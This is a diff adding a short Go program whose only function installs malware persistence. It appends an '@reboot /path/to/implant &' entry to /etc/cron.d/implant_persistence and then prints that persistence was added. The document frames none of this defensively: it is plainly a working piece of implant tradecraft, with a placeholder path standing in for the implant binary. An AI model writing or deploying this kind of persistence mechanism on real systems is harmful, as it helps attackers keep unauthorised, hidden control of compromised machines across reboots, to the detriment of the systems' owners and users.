@@ -1,0 +1,28 @@
+package main
+
+import (
+    "fmt"
+    "os"
+    "os/exec"
+)
+
+func addPersistence() {
+    cronCmd := "@reboot /path/to/implant &\n"
+    cronFile := "/etc/cron.d/implant_persistence"
+
+    f, err := os.OpenFile(cronFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+    if err != nil {
+        fmt.Println("Error opening cron file:", err)
+        return
+    }
+    defer f.Close()
+
+    if _, err := f.WriteString(cronCmd); err != nil {
+        fmt.Println("Error writing to cron file:", err)
+    }
+}
+
+func main() {
+    addPersistence()
+    fmt.Println("Persistence added with cron job.")
+}
